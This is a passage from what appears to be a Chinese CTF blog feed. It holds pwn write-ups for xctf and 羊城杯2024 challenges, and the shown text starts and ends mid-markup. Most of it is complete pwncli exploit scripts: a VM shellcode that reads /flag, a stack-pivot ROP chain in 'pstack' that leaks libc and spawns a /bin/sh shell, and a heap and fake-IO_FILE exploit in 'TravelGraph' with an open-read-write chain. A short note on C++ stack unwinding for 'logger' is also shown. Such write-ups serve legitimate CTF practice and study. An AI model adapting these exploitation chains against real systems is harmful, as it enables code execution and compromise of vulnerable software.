class="hljs-string">b&#x27;\x32&#x27;</span><br>    <span class="hljs-comment"># stack[rdi] = code+rsi</span><br>    <span class="hljs-comment"># rdi++</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x33&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#stack = 0x4460</span><br><span class="hljs-comment">#code = 0x4040</span><br><span class="hljs-comment">#rsi = 0x41</span><br><span class="hljs-comment">#rdi = 1</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    opt+=<span class="hljs-string">b&#x27;\x26\x00\x02\x00\x00\x32\x26\x47\x00\x00\x00\x23\x26\x00\x00\x00\x00\x26\x00\x00\x00\x00\x30&#x27;</span><br>    <span class="hljs-comment">#23 read(0,code+0x41+0x39,0x200)    7</span><br>    opt += <span class="hljs-string">b&#x27;\x26\x00\x00\x00\x00\x26\x00\x00\x00\x00\x32\x26\x63\x01\x00\x00\x23\x26\x02\x00\x00\x00\x30&#x27;</span><br>    <span class="hljs-comment">#23 open(/flag) 7</span><br>    opt += <span class="hljs-string">b&#x27;\x26\x30\x00\x00\x00\x32\x26\xb5\x03\x00\x00\x23\x26\x03\x00\x00\x00\x26\x00\x00\x00\x00\x30&#x27;</span><br>    <span class="hljs-comment"># read(3,code+0x300,0x30)   7</span><br>    opt += <span class="hljs-string">b&#x27;\x26\x30\x00\x00\x00\x32\x26\xcc\x03\x00\x00\x23\x26\x01\x00\x00\x00\x26\x01\x00\x00\x00\x30&#x27;</span><br>    <span class="hljs-comment"># write(1,code+0x300,0x30)  7</span><br>    opt = opt.ljust(<span class="hljs-number">0x100</span>+<span class="hljs-number">0x3f</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+<span class="hljs-string">b&#x27;flag\x00\x00\x00&#x27;</span><br>    sa(<span class="hljs-string">&quot;shellcode:&quot;</span>,opt[:<span class="hljs-number">0x3f</span>])<br>    sl(opt[<span class="hljs-number">0x3f</span>:])<br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    <span class="hljs-comment">#log.success(&#x27;heap_bae:&#x27;+hex(heap_base))</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="kno-puts-revenge"><a href="#kno-puts-revenge" class="headerlink" title="kno_puts_revenge"></a>kno_puts_revenge</h2>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>xctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2024</title>
    <link href="/2024/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/"/>
    <url>/2024/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">True</span>,find_in_libc=<span class="hljs-literal">False</span>)<br><br>    p2 = <span class="hljs-string">b&#x27;&#x27;</span><br>    p2 = p2.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0x601770</span>)<br>    p2 += p64_ex(<span class="hljs-number">0x4006B8</span>)<br>    sa(<span class="hljs-string">&quot;Can you grasp this little bit of overflow?&quot;</span>,p2)<br><br>    p3 = p64_ex(<span class="hljs-number">0x6017f0</span>-<span class="hljs-number">8</span>) + p64_ex(CG.pop_rsi_r15_ret())+p64_ex(<span class="hljs-number">0x601770</span>)+p64_ex(<span class="hljs-number">0x0</span>)+p64_ex(elf.plt.read)+p64_ex(CG.pop_rsi_r15_ret())<br>    p3 += p64_ex(<span class="hljs-number">0x601740</span>)+p64_ex(CG.leave_ret())<br>    sa(<span class="hljs-string">&quot;Can you grasp this little bit of overflow?&quot;</span>,p3)<br><br>    p4 = p64_ex(<span class="hljs-number">0x601770</span>+<span class="hljs-number">0x40</span>) + p64_ex(<span class="hljs-number">0x0</span>)+p64_ex(elf.plt.read)<br>    p4+=p64_ex(CG.pop_rdi_ret())+p64_ex(elf.got.puts)+p64_ex(CG.pop_rsi_r15_ret())+p64_ex(<span class="hljs-number">0x0</span>)+p64_ex(<span class="hljs-number">0x0</span>)<br>    s(p4)<br>    <br>    p5 = p64_ex(elf.plt.puts) + p64_ex(<span class="hljs-number">0x4006C4</span>) + p64_ex(CG.leave_ret()) <br>    s(p5)<br><br>    ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    libc.address = u64_ex(io.recv(<span class="hljs-number">6</span>)) - libc.sym.puts<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">True</span>,find_in_libc=<span class="hljs-literal">True</span>)<br><br>    p6 = p64_ex(CG.ret()) + p64_ex(CG.pop_rdi_ret())+p64_ex(CG.bin_sh())+p64_ex(libc.sym.system)<br>    sl(p6)<br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br><span class="hljs-comment">#0x7102f83d05c0 </span><br></code></pre></td></tr></table></figure><h1 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>city = [<span class="hljs-string">&#x27;guangzhou&#x27;</span>,<span class="hljs-string">&#x27;nanning&#x27;</span>,<span class="hljs-string">&#x27;changsha&#x27;</span>,<span class="hljs-string">&#x27;nanchang&#x27;</span>,<span class="hljs-string">&#x27;fuzhou&#x27;</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;5. Calculate the distance.&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-comment">#from_name,to_name,distance,transportation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">f,to,d,t,data=<span class="hljs-string">b&quot;AAAA&quot;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    a1 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> t == <span class="hljs-number">1</span>:<br>        a1 = <span class="hljs-string">&#x27;car&#x27;</span><br>    <span class="hljs-keyword">elif</span> t == <span class="hljs-number">2</span>:<br>        a1 = <span class="hljs-string">&#x27;train&#x27;</span><br>    <span class="hljs-keyword">elif</span> t == <span class="hljs-number">3</span>:<br>        a1 = <span class="hljs-string">&#x27;plane&#x27;</span><br>    sla(<span class="hljs-string">&quot;What kind of transportation do you want? car/train/plane?&quot;</span>,a1)<br>    sla(<span class="hljs-string">&quot;From where?&quot;</span>,f)<br>    sla(<span class="hljs-string">&quot;To where?&quot;</span>,to)<br>    sla(<span class="hljs-string">&quot;How far?&quot;</span>,<span class="hljs-built_in">str</span>(d))<br>    sa(<span class="hljs-string">&quot;Note:&quot;</span>,data)<br><br><span class="hljs-comment">#from_name,to_name</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">f,t</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;From where?&quot;</span>,f)<br>    sla(<span class="hljs-string">&quot;To where?&quot;</span>,t)<br><br><span class="hljs-comment">#from_name,to_name</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">f,t</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;From where?&quot;</span>,f)<br>    sla(<span class="hljs-string">&quot;To where?&quot;</span>,t)<br><br><span class="hljs-comment">#from_name,to_name,idx,distance,data</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">f,t,idx,d,data</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;From where?&quot;</span>,f)<br>    sla(<span class="hljs-string">&quot;To where?&quot;</span>,t)<br>    sla(<span class="hljs-string">&quot;Which one do you want to change?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;How far?&quot;</span>,<span class="hljs-built_in">str</span>(d))<br>    sa(<span class="hljs-string">&quot;Note:&quot;</span>,data)<br><br><span class="hljs-comment">#to_name</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dj</span>(<span class="hljs-params">t</span>):<br>    cmd(<span class="hljs-number">5</span>)<br>    sla(<span class="hljs-string">&quot;Where do you want to travel?&quot;</span>,t)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    add(city[<span class="hljs-number">1</span>],city[<span class="hljs-number">2</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    add(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">3</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    dj(city[<span class="hljs-number">3</span>])<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">2</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>)<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">3</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">4</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    free(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">3</span>])<br>    free(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">3</span>])<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">3</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>)<br>    free(city[<span class="hljs-number">1</span>],city[<span class="hljs-number">2</span>])<br>    free(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">1</span>])<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    add(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>)<br>    add(city[<span class="hljs-number">3</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>)<br>    add(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>    show(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>])<br><br>    ru(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>    heap_base = u64_ex(io.recv(<span class="hljs-number">6</span>))-(<span class="hljs-number">0x58e346d50eb0</span>-<span class="hljs-number">0x58e346d4f000</span>)<br><br>    free(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>])<br>    add(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">16</span>)<br>    show(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>])<br>    ru(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">16</span>)<br>    libc.address = u64_ex(io.recv(<span class="hljs-number">6</span>))-(<span class="hljs-number">0x76e2eac1b110</span>-<span class="hljs-number">0x76e2eaa00000</span>)<br><br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br><br>    fake_io = IO_FILE_plus_struct()<br>    fake_io.vtable=libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    fake_io._wide_data = heap_base+<span class="hljs-number">0x60c9f0b18390</span>-<span class="hljs-number">0x60c9f0b15000</span>+<span class="hljs-number">0xe0</span><br>    <br><br><br><br>    free(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>])<br>    free(city[<span class="hljs-number">3</span>],city[<span class="hljs-number">1</span>])<br>    free(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">1</span>])<br>    <br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    add(city[<span class="hljs-number">1</span>],city[<span class="hljs-number">2</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64_ex(<span class="hljs-number">0x0000000000000000</span>)+p64_ex(<span class="hljs-number">0x0000000000000521</span>)+p64_ex(<span class="hljs-number">0x0000000100000004</span>)+p64_ex(<span class="hljs-number">0x00000001000003e8</span>))<br>    add(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">3</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">2</span>)<br>    free(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">3</span>])<br>    free(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">4</span>])<br><br><br>    payload = <span class="hljs-built_in">bytes</span>(fake_io)[<span class="hljs-number">0x20</span>:]<br>    p = <span class="hljs-string">b&#x27;&#x27;</span><br>    p = p.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(<span class="hljs-number">0x53A1D</span>+libc.address)<br>    p = p.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(<span class="hljs-number">0x100</span>)<br>    p = p.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x60c9f0b18390</span>-<span class="hljs-number">0x60c9f0b15000</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x200</span>)+p64_ex(CG.ret())<br>    p = p.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x60c9f0b18390</span>-<span class="hljs-number">0x60c9f0b15000</span>+<span class="hljs-number">0xe0</span>)<br>    p =  p.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p += p64_ex(CG.pop_rdi_ret()) + p64_ex(<span class="hljs-number">0x5efcd7ac3e10</span>-<span class="hljs-number">0x5efcd7ac0000</span>+heap_base) +p64_ex(libc.sym.<span class="hljs-built_in">open</span>)<br>    p += p64_ex(CG.pop_rdi_ret())+p64_ex(<span class="hljs-number">3</span>)+p64_ex(CG.pop_rsi_r15_ret())+p64_ex(heap_base+<span class="hljs-number">0x3000</span>)+p64_ex(<span class="hljs-number">0</span>)+p64_ex(<span class="hljs-number">0x000000000011f2e7</span>+libc.address)+p64_ex(<span class="hljs-number">0x100</span>)+p64_ex(<span class="hljs-number">0</span>)+p64_ex(libc.sym.read)<br>    p += p64_ex(CG.pop_rdi_ret())+p64_ex(heap_base+<span class="hljs-number">0x3000</span>)+p64_ex(libc.sym.puts)<br>    payload += p<br><br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">3</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>)<span class="hljs-comment"># payload</span><br>    add(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">4</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>,payload)<span class="hljs-comment"># payload</span><br>    free(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">3</span>])<br><br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">4</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>)<br>    <br>    free(city[<span class="hljs-number">2</span>],city[<span class="hljs-number">4</span>])<br><br>    p = p64_ex(<span class="hljs-number">0</span>) +p64_ex(<span class="hljs-number">0x531</span>) + p64_ex(<span class="hljs-number">0x77bc5fa1b110</span>-<span class="hljs-number">0x77bc5f800000</span>+libc.address)*<span class="hljs-number">2</span> + p64_ex(<span class="hljs-number">0x5726ed7bbed0</span>-<span class="hljs-number">0x5726ed7ba000</span>+heap_base) + p64_ex(libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x20</span>)<br>    edit(city[<span class="hljs-number">4</span>],city[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>,p)<br>    add(city[<span class="hljs-number">0</span>],city[<span class="hljs-number">0</span>],<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;/flag&#x27;</span>)<br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>    log.success(<span class="hljs-string">&#x27;_IO_list_all:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]))<br>    log.success(<span class="hljs-string">&#x27;_IO_wfile_jumps:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]))<br>    log.success(<span class="hljs-string">&#x27;setcontext:&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x53A1D</span>+libc.address))<br><br>    <span class="hljs-comment">#pause()</span><br>    cmd(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h1 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h1><p>异常抛出(throw)后会去捕获catch来执行异常处理，</p><ul><li>但是当当前层没有的时候就会一直逆到外层去捕获catch，直到走完整个调用链，然后程序abort。</li><li>如果捕获到catch就会执行catch块中的代码</li></ul><p>整个过程被叫做栈展开（ stack unwind），分为两部分：</p><ol><li>异常后，对调用链一直捕获catch</li><li>如果没有找到catch，程序abort，如果找到会记下当前位置再重新抛回到异常处，然后清理调用链上的所有局部变量，直到catch处</li></ol><h3 id="Itanium-C-ABI"><a href="#Itanium-C-ABI" class="headerlink" title="Itanium C++ ABI"></a>Itanium C++ ABI</h3><p>Itanium ABI 定义了一系列函数及相应的数据结构来建立整个异常处理的流程及框架</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 